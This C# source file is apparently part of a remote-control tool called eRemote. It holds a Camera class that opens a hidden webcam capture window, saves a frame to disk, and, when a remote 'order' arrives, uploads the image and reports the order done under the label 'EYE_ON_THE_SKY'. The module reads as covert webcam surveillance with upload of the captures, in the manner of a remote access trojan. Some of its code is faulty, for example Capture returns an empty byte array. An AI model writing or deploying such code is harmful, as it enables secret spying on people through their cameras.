using System.IO;
using System.Drawing;
using System.Threading;
using System.Windows.Forms;
using System.Drawing.Imaging;
using System.Threading.Tasks;
using System.Runtime.InteropServices;
using eRemote_V2._0.LocalDatabase;

namespace eRemote_V2._0
{ 
public static class Camera
    {
        #region *** PInvoke Stuff - methods to interact with capture window ***
        [DllImport("user32", EntryPoint = "SendMessage")]
        static extern int SendMessage(int hWnd, uint Msg, int wParam, int lParam);
        [DllImport("avicap32.dll", EntryPoint = "capCreateCaptureWindowA")]
        static extern int capCreateCaptureWindowA(string lpszWindowName, int dwStyle,
            int X, int Y, int nWidth, int nHeight, int hwndParent, int nID);
        const int WM_CAP_CONNECT = 1034;
        const int WM_CAP_DISCONNECT = 1035;
        const int WM_CAP_COPY = 1054;
        const int WM_CAP_GET_FRAME = 1084;
        #endregion
        /// <summary>
        /// Captures a frame from the webcam and returns the byte array associated
        /// with the captured image
        /// </summary>
        /// <param name="connectDelay">number of milliseconds to wait between connect 
        /// and capture - necessary for some cameras that take a while to 'warm up'</param>
        /// <returns>byte array representing a bitmp or null (if error or no webcam)</returns>
        public static byte[] Capture(string filePath, int connectDelay = 500)
        {
            Clipboard.Clear();                                              // clear the clipboard
            int hCaptureWnd = capCreateCaptureWindowA("ccWebCam", 0, 0, 0,  // create the hidden capture window
                350, 350, 0, 0);
            SendMessage(hCaptureWnd, WM_CAP_CONNECT, 0, 0);                 // send the connect message to it
            Thread.Sleep(connectDelay);                                     // sleep the specified time
            SendMessage(hCaptureWnd, WM_CAP_GET_FRAME, 0, 0);               // capture the frame
            SendMessage(hCaptureWnd, WM_CAP_COPY, 0, 0);                    // copy it to the clipboard
            SendMessage(hCaptureWnd, WM_CAP_DISCONNECT, 0, 0);              // disconnect from the camera
            Bitmap bitmap = (Bitmap)Clipboard.GetDataObject().GetData(DataFormats.Bitmap);  // copy into bitmap
            if (bitmap == null)
                return null;
            using (MemoryStream stream = new MemoryStream())
            {
                bitmap.Save(filePath, ImageFormat.Jpeg);    // get bitmap bytes
                Clipboard.Clear();
                return stream.ToArray();
            }
        }

        /// <summary>
        /// Captures a frame from the webcam and returns the byte array associated
        /// with the captured image. The image is also stored in a file
        /// </summary>
        /// <param name="filePath">path the file wher ethe image will be saved</param>
        /// <param name="connectDelay">number of milliseconds to wait between connect 
        /// and capture - necessary for some cameras that take a while to 'warm up'</param>
        /// <returns>true on success, false on failure</returns>
        public static async Task<bool> CaptureAsync(string fileName, string key,string orderId)
        {
            byte[] capture = Capture($"./objs/{fileName}", 500);
            if (capture != null)
            {
                var link = await Uploader.UploadImagesAsync($"./objs/{fileName}", fileName, key);
                Orders.MarkOrderAsDone(key, orderId, "EYE_ON_THE_SKY", link);
            }
            return true;
        }
   
    }
}